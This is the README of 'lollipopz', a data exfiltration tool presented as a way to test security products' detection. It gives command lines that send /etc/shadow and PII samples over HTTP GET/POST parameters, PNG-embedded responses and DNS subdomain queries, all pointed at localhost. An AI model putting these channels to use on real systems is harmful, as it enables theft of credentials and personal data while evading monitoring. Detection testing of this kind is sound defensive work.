# lollipopz

    ░▒▓ lollipopz ▓▒░ Data exfiltration utility for testing detection capabilities

## Description

Data exfiltration utility used for testing detection capabilities of security products. Obviously for legal purposes only.

## Exfiltration How-To

### /etc/shadow -> HTTP GET requests

#### Server

    # ./lollipopz-cli.py -m lollipopz.methods.http.param_cipher.GETServer -lp 80 -o output.log

#### Client

    $ ./lollipopz-cli.py -m lollipopz.methods.http.param_cipher.GETClient -rh 127.0.0.1 -rp 80 -i ./samples/shadow.txt -r

### /etc/shadow -> HTTP POST requests

#### Server

    # ./lollipopz-cli.py -m lollipopz.methods.http.param_cipher.POSTServer -lp 80 -o output.log

#### Client

    $ ./lollipopz-cli.py -m lollipopz.methods.http.param_cipher.POSTClient -rh 127.0.0.1 -rp 80 -i ./samples/shadow.txt -r

### PII -> PNG embedded in HTTP Response

#### Server

    $ ./lollipopz-cli.py -m lollipopz.methods.http.image_response.Server -lp 37650 -o output.log

#### Client

    # ./lollipopz-cli.py -m lollipopz.methods.http.image_response.Client -rh 127.0.0.1 -rp 37650 -lp 80 -i ./samples/pii.txt -r

### PII -> DNS subdomains querying

#### Server

    # ./lollipopz-cli.py -m lollipopz.methods.dns.subdomain_cipher.Server -lp 53 -o output.log

#### Client

    $ ./lollipopz-cli.py -m lollipopz.methods.dns.subdomain_cipher.Client -rh 127.0.0.1 -rp 53 -i ./samples/pii.txt -r
